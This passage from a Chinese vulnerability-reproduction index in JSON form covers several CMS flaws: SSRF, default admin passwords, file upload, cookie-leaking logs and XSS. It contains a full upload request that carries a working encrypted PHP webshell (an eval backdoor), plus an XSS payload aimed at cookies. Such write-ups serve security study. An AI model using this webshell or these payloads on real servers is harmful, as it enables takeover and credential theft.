[!NOTE] \u6839\u76ee\u5f55\u53ef\u80fd\u4e0d\u540c\uff0cpayload\u9700\u8981\u66f4\u6539 \u70b9\u51fb\u91c7\u96c6\u8bfb\u53d6\u6839\u76ee\u5f55\u4e0b\u7684 Flag \u51fa\u73b0\u6f0f\u6d1e\u7684\u4ee3\u7801\u4f4d\u7f6e yzmcms/yzmphp/core/class/cache_factory.class.php \u8fd9\u91cc\u8c03\u7528 url_check \u51fd\u6570 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53ea\u68c0\u6d4b\u4e86\u524d4\u4f4d\u662f\u5426\u4e3a http\uff0c\u4f7f\u7528 httpxxx \u5373\u53ef\u7ed5\u8fc7","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%20Version%20%20%E5%B0%8F%E4%BA%8EV5.8%E6%AD%A3%E5%BC%8F%E7%89%88%20%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97%20SSRF%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"There are SSRF vulnerabilities in background collection management","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/","text":"\u534e\u5b9c\u4e92\u8054CMS\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u534e\u5b9c\u4e92\u8054CMS\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e\uff0c\u5982\u4e0d\u4fee\u6539\u5219\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u5373\u53ef\u767b\u5f55\u8d85\u7ea7\u7ba1\u7406\u5458 \u5f71\u54cd\u7248\u672c \u00b6 \u534e\u5b9c\u4e92\u8054CMS FOFA \u00b6 [!NOTE] body=\"\u534e\u5b9c\u7f51\u7edc\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u539f\u7248\u7684\u6e90\u7801\u9700\u8981\u4ed8\u8d39\uff0c\u53ef\u627e\u5230\u514d\u8d39\u7248\u7684\u6e90\u7801 \u5728\u76ee\u5f55\u4e0b\u7684DATA\u76ee\u5f55\u4e2d\u6709**mdb\u6587\u4ef6**, \u6253\u5f00\u540e\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u9ed8\u8ba4\u7684\u4e24\u4e2a\u7528\u6237 [!NOTE] admin/123456 lu123/cui123 \u4f7f\u7528 \u7528\u6237lu123 \u5373\u53ef\u767b\u5f55\u8d85\u7ea7\u7ba1\u7406\u5458 \u53c2\u8003\u6587\u7ae0 \u00b6 \u534e\u5b9c\u4e92\u80540day\u5206\u4eab","title":"\u534e\u5b9c\u4e92\u8054CMS\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#\u534e\u5b9c\u4e92\u8054cms\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e","text":"","title":"\u534e\u5b9c\u4e92\u8054CMS\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u534e\u5b9c\u4e92\u8054CMS\u9ed8\u8ba4\u5b58\u5728\u8d85\u7ea7\u7ba1\u7406\u5458\u6f0f\u6d1e\uff0c\u5982\u4e0d\u4fee\u6539\u5219\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u5373\u53ef\u767b\u5f55\u8d85\u7ea7\u7ba1\u7406\u5458","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"\u534e\u5b9c\u4e92\u8054CMS","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] body=\"\u534e\u5b9c\u7f51\u7edc\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u539f\u7248\u7684\u6e90\u7801\u9700\u8981\u4ed8\u8d39\uff0c\u53ef\u627e\u5230\u514d\u8d39\u7248\u7684\u6e90\u7801 \u5728\u76ee\u5f55\u4e0b\u7684DATA\u76ee\u5f55\u4e2d\u6709**mdb\u6587\u4ef6**, \u6253\u5f00\u540e\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u9ed8\u8ba4\u7684\u4e24\u4e2a\u7528\u6237 [!NOTE] admin/123456 lu123/cui123 \u4f7f\u7528 \u7528\u6237lu123 \u5373\u53ef\u767b\u5f55\u8d85\u7ea7\u7ba1\u7406\u5458","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94CMS%E9%BB%98%E8%AE%A4%E5%AD%98%E5%9C%A8%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"\u534e\u5b9c\u4e92\u80540day\u5206\u4eab","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u5feb\u6392CMS \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5feb\u6392CMS \u540e\u53f0\u7ba1\u7406\u6a21\u5757\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5feb\u6392 CMS <= 1.2 \u73af\u5883\u642d\u5efa \u00b6 https://gitee.com/qingzhanwang/kpcms \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b, \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html \u6e90\u7801\u4e2d\u6ca1\u6709\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u68c0\u6d4b thinkphp/library/think/File.php \u4efb\u610f\u627e\u4e00\u5904\u6587\u4ef6\u4e0a\u4f20\u70b9 \u4e0a\u4f20\u6293\u5305\u83b7\u53d6\u6587\u4ef6\u5730\u5740 POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream <?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?> ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- \u8fde\u63a5\u51b0\u874e\u6728\u9a6c\u5373\u53ef","title":"\u5feb\u6392CMS \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u5feb\u6392cms-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"","title":"\u5feb\u6392CMS \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5feb\u6392CMS \u540e\u53f0\u7ba1\u7406\u6a21\u5757\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5feb\u6392 CMS <= 1.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://gitee.com/qingzhanwang/kpcms","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b, \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html \u6e90\u7801\u4e2d\u6ca1\u6709\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u540e\u7f00\u68c0\u6d4b thinkphp/library/think/File.php \u4efb\u610f\u627e\u4e00\u5904\u6587\u4ef6\u4e0a\u4f20\u70b9 \u4e0a\u4f20\u6293\u5305\u83b7\u53d6\u6587\u4ef6\u5730\u5740 POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream <?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?> ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- \u8fde\u63a5\u51b0\u874e\u6728\u9a6c\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u5feb\u6392CMS \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5feb\u6392CMS \u9ed8\u8ba4\u5f00\u542f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u7531\u4e8e\u65e5\u5fd7\u540d\u4e3a\u65f6\u95f4\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u9020\u6210\u7ba1\u7406\u5458\u7684Cookie\u6cc4\u9732 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5feb\u6392 CMS <= 1.2 \u73af\u5883\u642d\u5efa \u00b6 https://gitee.com/qingzhanwang/kpcms \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6587\u4ef6 thinkphp/library/think/log/driver/Socket.php \u8fd9\u91cc\u9ed8\u8ba4\u5f00\u542f\u65e5\u5fd7\u5199\u5165 runtime/log/202104/06.log \u5176\u4e2d\u53ef\u4ee5\u770b\u5230\u6cc4\u9732\u4e86\u7ba1\u7406\u5458\u7684Cookie\u4fe1\u606f\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f \u5e76\u4e14\u6587\u4ef6\u547d\u540d\u4e3a \u5e74+\u6708/\u65e5\u671f.log \u8fd9\u91cc\u5173\u6ce8\u540e\u53f0\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684 admin.php\u9875\u9762\u7684cookie\u5c31\u53ef\u4ee5\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650","title":"\u5feb\u6392CMS \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u5feb\u6392cms-\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","text":"","title":"\u5feb\u6392CMS \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5feb\u6392CMS \u9ed8\u8ba4\u5f00\u542f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u7531\u4e8e\u65e5\u5fd7\u540d\u4e3a\u65f6\u95f4\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u9020\u6210\u7ba1\u7406\u5458\u7684Cookie\u6cc4\u9732","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5feb\u6392 CMS <= 1.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://gitee.com/qingzhanwang/kpcms","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6587\u4ef6 thinkphp/library/think/log/driver/Socket.php \u8fd9\u91cc\u9ed8\u8ba4\u5f00\u542f\u65e5\u5fd7\u5199\u5165 runtime/log/202104/06.log \u5176\u4e2d\u53ef\u4ee5\u770b\u5230\u6cc4\u9732\u4e86\u7ba1\u7406\u5458\u7684Cookie\u4fe1\u606f\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f \u5e76\u4e14\u6587\u4ef6\u547d\u540d\u4e3a \u5e74+\u6708/\u65e5\u671f.log \u8fd9\u91cc\u5173\u6ce8\u540e\u53f0\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684 admin.php\u9875\u9762\u7684cookie\u5c31\u53ef\u4ee5\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/","text":"\u5feb\u6392CMS \u540e\u53f0XSS\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5feb\u6392CMS \u540e\u53f0\u5b58\u5728XSS\u6f0f\u6d1e\uff0c\u901a\u8fc7\u540e\u53f0\u6784\u9020\u7279\u6b8a\u8bed\u53e5\u53ef\u4ee5\u9020\u6210\u8bbf\u95ee\u7f51\u7ad9\u7684\u7528\u6237\u88abXSS\u5f71\u54cd \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5feb\u6392 CMS <= 1.2 \u73af\u5883\u642d\u5efa \u00b6 https://gitee.com/qingzhanwang/kpcms \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u51fa\u73b0\u5728\u767b\u5f55\u540e\u53f0\u7684\u7f51\u7ad9\u7f16\u8f91\u7684\u4f4d\u7f6e\uff0c\u7531\u4e8e\u6ca1\u6709\u5bf9\u8f93\u51fa\u7684\u5b57\u7b26\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bfc\u81f4XSS \u4e3b\u9875\u7248\u6743\u5904\u5d4c\u5165XSS\u4ee3\u7801","title":"\u5feb\u6392CMS \u540e\u53f0XSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u5feb\u6392cms-\u540e\u53f0xss\u6f0f\u6d1e","text":"","title":"\u5feb\u6392CMS \u540e\u53f0XSS\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5feb\u6392CMS \u540e\u53f0\u5b58\u5728XSS\u6f0f\u6d1e\uff0c\u901a\u8fc7\u540e\u53f0\u6784\u9020\u7279\u6b8a\u8bed\u53e5\u53ef\u4ee5\u9020\u6210\u8bbf\u95ee\u7f51\u7ad9\u7684\u7528\u6237\u88abXSS\u5f71\u54cd","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5feb\u6392 CMS <= 1.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"https://gitee.com/qingzhanwang/kpcms","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%8E%92CMS/%E5%BF%AB%E6%8E%92CMS%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6f0f\u6d1e\u51fa\u73b0\u5728\u767b\u5f55\u540e\u53f0\u7684\u7f51\u7ad9\u7f16\u8f91\u7684\u4f4d\u7f6e\uff0c\u7531\u4e8e\u6ca1\u6709\u5bf9\u8f93\u51fa\u7684\u5b57\u7b26\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5bfc\u81f4XSS \u4e3b\u9875\u7248\u6743\u5904\u5d4c\u5165XSS\u4ee3\u7801","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS%201.81%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS/","text":"\u6781\u81f4CMS 1.81\u4ee5\u4e0b\u7248\u672c \u5b58\u50a8\u578bXSS \u00b6 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u7ba1\u7406\u5458\u6dfb\u52a0\u6a21\u5757 \u6ce8\u518c\u7528\u6237 \u70b9\u51fb\u53d1\u5e03\u6587\u7ae0 \u5728\u6587\u7ae0\u6807\u9898\u5904\u63d2\u5165xss payload <details open ontoggle= confirm(document[`coo`+`kie`])> \u5f53\u7ba1\u7406\u5458\u8bbf\u95ee\u65f6XSS\u6210\u529f \u53c2\u8003 \u00b6 \u6781\u81f4CMS\u4ee3\u7801\u5ba1\u8ba1","title":"\u6781\u81f4CMS 1.81\u4ee5\u4e0b\u7248\u672c \u5b58\u50a8\u578bXSS"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS%201.81%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#\u6781\u81f4cms-181\u4ee5\u4e0b\u7248\u672c-\u5b58\u50a8\u578bxss","text":"","title":"\u6781\u81f4CMS 1.81\u4ee5\u4e0b\u7248\u672c \u5b58\u50a8\u578bXSS"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS%201.81%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u7ba1\u7406\u5458\u6dfb\u52a0\u6a21\u5757 \u6ce8\u518c\u7528\u6237 \u70b9\u51fb\u53d1\u5e03\u6587\u7ae0 \u5728\u6587\u7ae0\u6807\u9898\u5904\u63d2\u5165xss payload <details open ontoggle= confirm(document[`coo`+`kie`])> 